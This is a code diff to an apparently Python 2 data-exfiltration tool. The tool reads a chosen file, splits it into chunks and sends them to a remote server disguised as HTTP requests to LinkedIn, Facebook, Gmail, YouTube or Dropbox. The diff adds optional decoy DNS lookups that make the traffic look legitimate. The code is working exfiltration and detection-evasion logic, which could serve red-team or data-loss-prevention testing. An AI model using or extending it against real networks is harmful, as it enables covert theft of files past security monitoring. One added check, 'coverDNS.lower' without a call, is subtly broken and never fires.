@@ -35,6 +35,7 @@ def main():
 
 def testChunk(server, port):
     apps = ['www.linkedin.com','www.facebook.com','www.gmail.com','www.youtube.com', 'www.dropbox.com']
+
     while True:
         try:
             startBytes = int(raw_input('Enter the number initial number of bytes to test: '))
@@ -59,12 +60,17 @@ def testChunk(server, port):
         except ValueError:
             print 'Invalid input!'
 
+    coverDNS = raw_input('Make DNS request for spoofed domain? ')
     curBytes = startBytes
 
     while curBytes < int(maxBytes):
         spoofedApp = apps[randint(0,len(apps)-1)]
         try:
             testData = ''.join(choice(string.ascii_letters + string.digits + '!@#$%^&*()') for x in range(curBytes))
+
+            if coverDNS.lower == 'y':
+                socket.gethostbyname(spoofedApp)
+
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.settimeout(15)
             s.connect((server, port))
@@ -88,6 +94,7 @@ def testChunk(server, port):
 def sendFile(server, port):
     sourceFile = raw_input('Enter filename to exfiltrate: ')
     pieceSize = int(raw_input('Enter chunk size to send (be sure to account for app spoofing size): '))
+    coverDNS = raw_input('Make DNS request for spoofed domain? ')
     apps = ['www.linkedin.com', 'www.facebook.com', 'www.gmail.com', 'www.youtube.com', 'www.dropbox.com']
     chunkCount = 1
 
@@ -103,6 +110,10 @@ def sendFile(server, port):
 
             try:
                 spoofedApp = apps[randint(0,len(apps)-1)]
+
+                if coverDNS.lower() == 'y':
+                    socket.gethostbyname(spoofedApp)
+
                 s.connect((server, port))
                 print 'Sending chunk ' + str(chunkCount) + ' spoofed as ' + spoofedApp.split('.')[1]
                 s.send('GET / HTTP/1.1\nHost: ' + spoofedApp + '\nUser-Agent:Mozilla/5.0 (Windows NT 6.1)\nConnection:close\n\n' + piece)
